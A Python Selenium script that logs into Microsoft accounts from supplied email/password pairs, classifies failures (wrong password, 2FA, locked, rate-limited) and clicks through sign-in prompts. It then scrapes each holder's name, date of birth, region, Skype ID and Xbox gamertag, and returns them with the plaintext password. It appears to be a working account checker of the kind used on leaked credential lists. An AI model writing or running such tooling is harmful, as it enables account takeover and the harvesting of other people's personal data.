from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
import time
import os
import pycountry
from automation.driver import create_driver

all_countries = {country.name for country in pycountry.countries}

SCREENSHOT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

LOGIN_DOMAINS = ("login.live.com", "login.microsoftonline.com", "account.live.com/resproc")

LOGIN_ERROR_TEXTS = [
    "your account or password is incorrect",
    "account or password is incorrect",
    "that microsoft account doesn't exist",
    "password is incorrect",
    "sign-in name or password",
    "your account has been locked",
    "account is blocked",
]

CHALLENGE_PHRASES = [
    "unusual sign-in activity",
    "verify your identity",
    "help us protect your account",
    "prove you're not a robot",
    "suspicious activity",
    "security challenge",
    "additional verification",
    "confirm your identity",
    "two-step verification",
]


def clean_text(text):
    if not text:
        return ""
    return "".join(c for c in str(text) if ord(c) <= 0xFFFF)


def save_screenshot(driver, label="debug"):
    try:
        safe_label = "".join(c for c in label if c.isalnum() or c in "_-")[:60]
        path = os.path.join(SCREENSHOT_DIR, f"{safe_label}.png")
        driver.save_screenshot(path)
        print(f"📸 Screenshot saved: {path}")
        return path
    except Exception as e:
        print(f"⚠️ Screenshot failed: {e}")
        return None


def _page_source_lower(driver):
    try:
        return driver.page_source.lower()
    except Exception:
        return ""


def _is_login_error_present(driver):
    src = _page_source_lower(driver)
    for txt in LOGIN_ERROR_TEXTS:
        if txt in src:
            print(f"⚠️ Login error detected: '{txt}'")
            return True
    return False


def _handle_challenges(driver):
    src = _page_source_lower(driver)
    url = driver.current_url
    title = driver.title

    # Stay signed in?
    if "stay signed in?" in title.lower() or "ppsecure/post.srf" in url or "stay signed in?" in src:
        print("🔄 'Stay signed in?' detected — clicking Yes...")
        for selector in [
            (By.XPATH, "//input[@value='Yes']"),
            (By.XPATH, "//button[contains(text(),'Yes')]"),
            (By.ID, "acceptButton"),
            (By.ID, "idSIButton9"),
            (By.CSS_SELECTOR, "input[type='submit'][value='Yes']"),
        ]:
            try:
                btn = WebDriverWait(driver, 4).until(EC.element_to_be_clickable(selector))
                btn.click()
                print("✅ Clicked Yes on Stay signed in")
                time.sleep(2)
                return True
            except Exception:
                pass
        try:
            driver.find_element(By.XPATH, "//input[@value='No']").click()
            print("➡️ Clicked No on Stay signed in (fallback)")
            time.sleep(2)
            return True
        except Exception:
            pass
        return True

    # Security challenges
    for phrase in CHALLENGE_PHRASES:
        if phrase in src:
            print(f"🛡️ Challenge page detected: '{phrase}'")
            for btn_text in ["Send email", "Email a code", "Text a code", "Send code", "Use app"]:
                try:
                    btn = driver.find_element(By.XPATH, f"//*[contains(text(), '{btn_text}')]")
                    if btn.is_displayed():
                        btn.click()
                        print(f"➡️ Clicked '{btn_text}'")
                        time.sleep(2)
                        return True
                except Exception:
                    pass
            return True

    # Authenticator push
    if "microsoft authenticator" in src or "approve the request" in src:
        print("🛡️ Authenticator push detected.")
        return True

    # OTP page
    if "otc" in url or "enter code" in src or "verification code" in src:
        print("🛡️ OTP/2FA page detected.")
        return True

    # Account locked
    if "account has been locked" in src:
        print("🚫 Account locked.")
        return True

    return False


def _wait_past_login(driver, timeout=25):
    deadline = time.time() + timeout
    challenge_found = False

    while time.time() < deadline:
        try:
            url = driver.current_url
        except WebDriverException:
            time.sleep(1)
            continue

        if not any(d in url for d in LOGIN_DOMAINS):
            print(f"✅ Past login → {url}")
            return True, False
        if _is_login_error_present(driver):
            return False, False
        if _handle_challenges(driver):
            challenge_found = True
        time.sleep(1.5)

    try:
        url = driver.current_url
        if not any(d in url for d in LOGIN_DOMAINS):
            return True, False
    except Exception:
        pass

    print(f"⚠️ Still on login page after {timeout}s")
    return False, challenge_found


def _dismiss_post_login_prompts(driver):
    prompts = [
        (By.ID, "iLandingViewAction"),
        (By.CSS_SELECTOR, 'button[data-testid="primaryButton"]'),
        (By.XPATH, '//button[@aria-label="Close"]'),
        (By.XPATH, '//button[contains(text(), "Got it")]'),
        (By.XPATH, '//button[contains(text(), "Not now")]'),
    ]
    for selector in prompts:
        try:
            btn = WebDriverWait(driver, 3).until(EC.element_to_be_clickable(selector))
            btn.click()
            print(f"✅ Dismissed post-login prompt: {selector[1]}")
            time.sleep(1)
        except Exception:
            pass


def _reach_password_input(driver, wait):
    try:
        return WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.NAME, "passwd"))
        )
    except TimeoutException:
        pass

    # Try alternate buttons
    for label, xpath in [
        ("'Use your password'", "//span[contains(text(), 'Use your password')]"),
        ("'Other ways to sign in'", "//span[contains(text(), 'Other ways to sign in')]"),
        ("'Sign in another way'", "//*[@id='idA_PWD_SwitchToCredPicker']"),
    ]:
        try:
            btn = WebDriverWait(driver, 4).until(EC.element_to_be_clickable((By.XPATH, xpath)))
            btn.click()
            print(f"➡️ Clicked {label}")
            time.sleep(1.5)

            # After "Other ways", click "Use your password"
            if "Other ways" in label:
                try:
                    WebDriverWait(driver, 4).until(
                        EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Use your password')]"))
                    ).click()
                    time.sleep(1.5)
                except Exception:
                    pass

            try:
                return WebDriverWait(driver, 6).until(
                    EC.presence_of_element_located((By.NAME, "passwd"))
                )
            except TimeoutException:
                continue
        except TimeoutException:
            continue

    return None


def scrape_account_info(email: str, password: str) -> dict:
    driver = create_driver()
    wait = WebDriverWait(driver, 20)

    try:
        print(f"🌐 Navigating to Microsoft login for: {email}")
        driver.get("https://login.live.com")
        time.sleep(1)

        # Enter email
        email_input = wait.until(EC.presence_of_element_located((By.ID, "usernameEntry")))
        email_input.clear()
        email_input.send_keys(clean_text(email))
        email_input.send_keys(Keys.RETURN)
        print("✅ Email submitted")
        time.sleep(2)

        # Reach password field
        password_input = _reach_password_input(driver, wait)
        if password_input is None:
            shot = save_screenshot(driver, f"no_pwd_{email.split('@')[0]}")
            print("❌ Could not reach password input")
            return {
                "email": email,
                "error": "Could not reach password input",
                "screenshot": shot,
                "page_title": driver.title,
                "page_url": driver.current_url,
            }

        # Enter password
        time.sleep(0.5)
        password_input.clear()
        password_input.send_keys(clean_text(password))
        password_input.send_keys(Keys.RETURN)
        print("🔑 Password submitted, awaiting redirect...")
        time.sleep(3)

        if _is_login_error_present(driver):
            shot = save_screenshot(driver, f"wrong_pwd_{email.split('@')[0]}")
            return {
                "email": email,
                "error": "Incorrect password",
                "screenshot": shot,
                "page_title": driver.title,
                "page_url": driver.current_url,
            }

        login_ok, challenge = _wait_past_login(driver, timeout=25)

        if not login_ok:
            shot = save_screenshot(driver, f"login_fail_{email.split('@')[0]}")
            if challenge:
                err = "Account requires 2FA or identity verification"
            elif _is_login_error_present(driver):
                err = "Incorrect password"
            else:
                err = "Login blocked by Microsoft"
            return {
                "email": email,
                "error": err,
                "screenshot": shot,
                "page_title": driver.title,
                "page_url": driver.current_url,
            }

        print("✅ Login successful")

        # Rate limit check
        for _ in range(15):
            try:
                if "too many requests" in _page_source_lower(driver):
                    print("⚠️ Rate limited — retrying...")
                    time.sleep(2)
                    driver.refresh()
                else:
                    break
            except Exception:
                break

        _dismiss_post_login_prompts(driver)

        # Profile page
        print("🌐 Loading profile page...")
        driver.get("https://account.microsoft.com/profile")
        time.sleep(3)
        # Reload once to ensure the page is fully rendered
        driver.get("https://account.microsoft.com/profile")
        time.sleep(2)

        name = "Unknown"
        dob = "DOB not found"
        region = "Region not found"

        try:
            wait.until(EC.presence_of_element_located(
                (By.ID, "profile.profile-page.personal-section.full-name")
            ))
            time.sleep(0.5)
            name = driver.find_element(
                By.ID, "profile.profile-page.personal-section.full-name"
            ).text.strip() or "Unknown"
            print(f"🔹 Name: {name}")

            spans = driver.find_elements(By.CSS_SELECTOR, "span.fui-Text")
            for span in spans:
                text = span.text.strip()
                parts = text.split("/")
                if len(parts) == 3 and all(p.strip().isdigit() for p in parts):
                    dob = text
                    print(f"🔹 DOB: {dob}")
                elif text in all_countries:
                    region = text
                    print(f"🔹 Region: {region}")
        except Exception as e:
            print(f"⚠️ Profile scrape partial fail: {e}")
            if name == "Unknown":
                return {"email": email, "error": "Couldn't get account info — account may be blocked"}

        # Skype
        print("🌐 Loading Skype profile...")
        driver.get("https://secure.skype.com/portal/profile")
        time.sleep(3)
        skype_id = "live:"
        skype_email = email
        try:
            skype_id = driver.find_element(By.CLASS_NAME, "username").text.strip() or "live:"
            print(f"🔹 Skype ID: {skype_id}")
        except Exception:
            pass
        try:
            skype_email = driver.find_element(By.ID, "email1").get_attribute("value").strip() or email
            print(f"🔹 Skype email: {skype_email}")
        except Exception:
            pass

        # Xbox
        print("🌐 Loading Xbox profile...")
        driver.get("https://www.xbox.com/en-IN/play/user")
        time.sleep(5)
        gamertag = "Not found"
        try:
            try:
                sign_in = driver.find_element(By.XPATH, '//a[contains(text(), "Sign in")]')
                sign_in.click()
                time.sleep(7)
            except Exception:
                pass
            try:
                WebDriverWait(driver, 8).until(
                    EC.element_to_be_clickable((By.XPATH, '//span[@role="button"]'))
                ).click()
                WebDriverWait(driver, 12).until(EC.url_contains("/play/user/"))
            except Exception:
                pass
            url = driver.current_url
            if "/play/user/" in url:
                gamertag = url.split("/play/user/")[-1].replace("%20", " ").replace("%25", "%")
                print(f"🔹 Gamertag: {gamertag}")
        except Exception as e:
            gamertag = "Error"
            print(f"⚠️ Xbox scrape failed: {e}")

        return {
            "email": email,
            "password": password,
            "name": name,
            "dob": dob,
            "region": region,
            "skype_id": skype_id,
            "skype_email": skype_email,
            "gamertag": gamertag,
        }

    except Exception as e:
        print(f"❌ Unexpected error in scrape_account_info: {e}")
        try:
            save_screenshot(driver, f"exception_{email.split('@')[0]}")
        except Exception:
            pass
        return {"email": email, "error": f"Unexpected error: {str(e)[:200]}"}

    finally:
        try:
            driver.quit()
        except Exception:
            pass
